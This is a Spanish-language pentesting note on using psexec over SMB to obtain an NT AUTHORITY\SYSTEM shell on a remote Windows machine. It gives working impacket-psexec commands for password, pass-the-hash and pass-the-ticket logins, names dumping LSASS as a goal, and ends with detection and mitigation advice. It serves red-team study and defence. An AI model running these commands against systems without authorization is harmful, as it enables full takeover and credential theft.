---
title: Conectarse como NT AUTHORITY\SYSTEM
resumen: La única de las cuatro vías que da directamente una consola con el privilegio máximo del equipo, sin pasos extra.
tags: psexec
---

## Definición

A diferencia de RDP, WinRM o WMI —que abren la sesión con el contexto de seguridad del usuario que se autentica—, **psexec** instala temporalmente un servicio en el equipo remoto a través del **Service Control Manager** (SMB/445) y lo arranca. Como todo servicio de Windows arranca por defecto bajo la cuenta **`NT AUTHORITY\SYSTEM`** (el privilegio más alto que existe a nivel local), el resultado es una consola con privilegios de SYSTEM de forma directa, sin necesitar ningún paso adicional de escalada — siempre que la cuenta con la que te autenticas ya sea administradora del equipo.

## Cuándo se usa

Cuando el objetivo final no es solo ejecutar un comando puntual, sino tener el control total del equipo (volcar LSASS, leer cualquier archivo del sistema, modificar cualquier configuración) y ya se dispone de credenciales de administrador local o de dominio sobre esa máquina.

## Requisitos previos

- Credenciales de administrador (contraseña, hash NTLM, o ticket Kerberos válido) sobre el equipo objetivo.
- Puerto 445 (SMB) accesible, para el Service Control Manager.

## Desarrollo del ataque

1. Confirmar privilegios administrativos sobre el objetivo.
2. Conectarse con `psexec`, autenticando por contraseña, hash (Pass the Hash) o ticket (Pass the Ticket).
3. Comprobar el contexto de la sesión obtenida — debería ser ya `NT AUTHORITY\SYSTEM` sin pasos adicionales.

```bash
# Contraseña
impacket-psexec dominio.local/USUARIO:'PASS'@IP

# Pass the Hash
impacket-psexec 'usuario'@IP -hashes ':hash'

# Pass the Ticket (Kerberos, forest)
impacket-psexec child.dominio.local/Administrator@DC01.dominio.local -k -no-pass
```

```
C:\Windows\system32> whoami
nt authority\system
```

## Herramientas relacionadas

- Ver [[psexec]]

## Detección y mitigación

Auditar la creación remota de servicios (evento 7045 en el equipo objetivo, y 5145 sobre el recurso `IPC$`/`ADMIN$` implicado), restringir qué cuentas pueden administrar remotamente cada equipo, y usar LAPS para que las contraseñas de administrador local no se repitan entre máquinas (limita el alcance si una credencial de este tipo se compromete).
